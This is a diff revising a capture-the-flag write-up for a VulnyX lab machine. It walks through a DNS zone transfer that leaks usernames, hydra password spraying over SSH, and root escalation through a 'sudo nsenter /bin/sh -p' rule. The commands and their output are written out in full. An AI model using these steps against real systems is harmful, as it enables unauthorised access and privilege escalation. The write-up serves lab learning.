@@ -7,15 +7,15 @@
 | **Difficulty** | Easy |
 | **Creator** | `d4t4s3c` |
 | **Tools used** | `nmap` · `gobuster` · `dig` · `hydra` · `nsenter` |
-| **Tags** | `#DNS` `#ZoneTransfer` `#InfoDisclosure` `#PasswordSpraying` `#ContainerEscape` |
+| **Tags** | `#DNS` `#ZoneTransfer` `#InfoDisclosure` `#PasswordSpraying` `#SudoAbuse` |
 | **URL** | https://vulnyx.com/machines/ |
 
-A reverse DNS lookup on the box's own resolver reveals a second internal domain, and an unauthenticated zone transfer against it leaks a full list of employee usernames. Spraying that list against itself over SSH — testing each name as a possible password for every other — lands valid credentials, since one user's password turns out to just be a colleague's username. From there, a `sudo` rule around `nsenter` is enough to escalate to root.
+A reverse DNS lookup on the box's own resolver reveals a second internal domain, and an unauthenticated zone transfer against it leaks a full list of employee usernames. Spraying that list against itself over SSH — testing each name as a possible password for every other — lands valid credentials, since one user's password turns out to just be a colleague's username. From there, a `sudo` rule around `nsenter` hands over a root shell directly.
 
 ## Enumeration
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn lookup.nyx
@@ -27,7 +27,7 @@ PORT   STATE  SERVICE  REASON
 MAC Address: 08:00:27:30:39:FA (Oracle VirtualBox virtual NIC)
 ```
 
-Three ports are found open: **22 (SSH)**, **53 (DNS)**, and **80 (HTTP)**. A version/script scan against all three fills in the details:
+Three ports come back open: **22 (SSH)**, **53 (DNS)**, and **80 (HTTP)**. A version and script scan on all three fills in the details:
 
 ```bash
 $ sudo nmap -p 22,53,80 -sCV lookup.nyx
@@ -57,6 +57,7 @@ The main page:
 ```
 http://lookup.nyx
 ```
+
 <img src="../Images/lookup/Pasted image 20260726232211.png"/>
 
 ```bash
@@ -73,14 +74,16 @@ Finished
 =====================================================
 ```
 
+The web root is just an "Under Construction" placeholder, so the DNS service is the lead worth chasing.
+
 ### DNS Enumeration
 
-A reverse lookup against the box's own IP, using its own resolver, is checked first:
+A reverse lookup against the box's own IP, using its own resolver, comes first:
 
 ```bash
-$ dig -x <IP_Victim> @lookup.nyx
+$ dig -x <VICTIM_IP> @lookup.nyx
 
-; <<>> DiG 9.20.24-1+b1-Debian <<>> -x <IP_Victim> @lookup.nyx
+; <<>> DiG 9.20.24-1+b1-Debian <<>> -x <VICTIM_IP> @lookup.nyx
 ;; global options: +cmd
 ;; Got answer:
 ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 1080
@@ -100,7 +103,7 @@ $ dig -x <IP_Victim> @lookup.nyx
 2.0.10.in-addr.arpa.   86400   IN      NS      ns1.silvertech.nyx.
 
 ;; ADDITIONAL SECTION:
-ns1.silvertech.nyx.    86400   IN      A       <IP_Victim>
+ns1.silvertech.nyx.    86400   IN      A       <VICTIM_IP>
 
 ;; Query time: 0 msec
 ;; SERVER: lookup.nyx#53(lookup.nyx) (UDP)
@@ -108,7 +111,7 @@ ns1.silvertech.nyx.    86400   IN      A       <IP_Victim>
 ;; MSG SIZE  rcvd: 141
 ```
 
-This surfaces a second domain — `silvertech.nyx` — hosted on the same DNS server. A zone transfer (`AXFR`) is attempted against it: this is a mechanism meant for secondary DNS servers to replicate an entire zone from the primary, and when it's not restricted to trusted hosts, anyone who asks gets the whole zone dumped back:
+This surfaces a second domain — `silvertech.nyx` — hosted on the same DNS server. A zone transfer (`AXFR`) is worth attempting against it: this is a mechanism meant for secondary DNS servers to replicate an entire zone from the primary, and when it's not restricted to trusted hosts, anyone who asks gets the whole zone dumped back:
 
 ```bash
 $ dig axfr silvertech.nyx @lookup.nyx
@@ -125,9 +128,9 @@ it.silvertech.nyx.      86400   IN      TXT     "p.logan@silvertech.nyx"
 it.silvertech.nyx.      86400   IN      TXT     "j.carter@silvertech.nyx"
 it.silvertech.nyx.      86400   IN      TXT     "r.turner@silvertech.nyx"
 it.silvertech.nyx.      86400   IN      TXT     "s.hughes@silvertech.nyx"
-ns1.silvertech.nyx.     86400   IN      A       <IP_Victim>
+ns1.silvertech.nyx.     86400   IN      A       <VICTIM_IPm>
 support.silvertech.nyx. 86400   IN      TXT     "p.hollen@silvertech.nyx"
-www.silvertech.nyx.     86400   IN      A       <IP_Victim>
+www.silvertech.nyx.     86400   IN      A       <VICTIM_IP>
 silvertech.nyx.         86400   IN      SOA     ns1.silvertech.nyx. admin.silvertech.nyx. 1 36
 00 1800 604800 86400
 ;; Query time: 0 msec
@@ -144,7 +147,7 @@ The zone leaks a full list of usernames:
 
 ### Credential Reuse via SSH
 
-Rather than a wordlist, the same username list is sprayed against itself — testing whether any user's password is simply another user's name:
+Rather than a wordlist, spraying the same username list against itself tests whether any user's password is simply another user's name:
 
 ```bash
 $ hydra -L users.txt -P users.txt ssh://silvertech.nyx
@@ -164,19 +167,10 @@ k
 
 ```bash
 $ ssh m.bailey@silvertech.nyx
-** WARNING: connection is not using a post-quantum key exchange algorithm.
-** This session may be vulnerable to "store now, decrypt later" attacks.
-** The server may need to be upgraded. See https://openssh.com/pq.html
 m.bailey@silvertech.nyx's password:
 Linux lookup 4.19.0-24-amd64 #1 SMP Debian 4.19.282-1 (2023-04-29) x86_64
 m.bailey@lookup:~$ id
 uid=1000(m.bailey) gid=1000(m.bailey) groups=1000(m.bailey)
-```
-
-```bash
-m.bailey@lookup:~$ ls -l /home
-total 4
-drwx------ 3 m.bailey m.bailey 4096 Jul 18 18:25 m.bailey
 m.bailey@lookup:~$ ls -l /home/m.bailey/
 total 4
 -r-------- 1 m.bailey m.bailey 33 Jul 18 18:25 user.txt
@@ -188,7 +182,7 @@ m.bailey@lookup:~$ cat /home/m.bailey/user.txt
 
 ## Privilege Escalation
 
-### `nsenter`
+### `sudo nsenter`
 
 ```bash
 m.bailey@lookup:~$ sudo -l
@@ -200,7 +194,7 @@ User m.bailey may run the following commands on lookup:
     (root) NOPASSWD: /usr/bin/nsenter
 ```
 
-`nsenter` enters the namespaces of another running process. When `sudo` allows running it against PID 1 (the init process) with the host's mount, network, and PID namespaces, the effect is equivalent to stepping outside of any container isolation entirely — the resulting shell sees the host filesystem and process tree, not a restricted subset of it:
+`nsenter` is normally used to run a program inside another process's namespaces, but here the abuse is simpler than that. `sudo` runs `nsenter` as root, and with no target namespaces given it just executes the program it's handed — `/bin/sh -p` — in the current context. Because the process is already root and `-p` keeps it from dropping the effective UID, the result is a straight root shell (the standard GTFOBins `sudo nsenter` technique):
 
 ```bash
 m.bailey@lookup:~$ sudo /usr/bin/nsenter /bin/sh -p
@@ -220,4 +214,4 @@ d38cf53dd5e7f99c695bd4b0fdbe3985
 - A DNS server exposed on the target itself is worth querying directly — reverse lookups and zone transfer attempts can reveal internal domains and records that never show up in any web-based enumeration.
 - An unrestricted `AXFR` zone transfer is effectively a full read of everything that domain's DNS server knows, useful far beyond just IP-to-hostname mappings — subdomains, mail records, and in this case, a list of real usernames.
 - Password reuse across colleagues (one person's password matching another's username) is a realistic pattern worth testing for directly — spraying a leaked user list against itself is often more effective than a generic wordlist.
-- `nsenter` granted through `sudo` is a container/namespace escape primitive by design, not a coincidental misconfiguration — its entire purpose is crossing the boundary it's normally used to inspect.
+- Any binary allowed through `sudo` that can exec another program is a root shell waiting to happen — `nsenter` runs the shell it's handed as root and (with `-p`) keeps those privileges, so the sudo rule may as well be unrestricted.
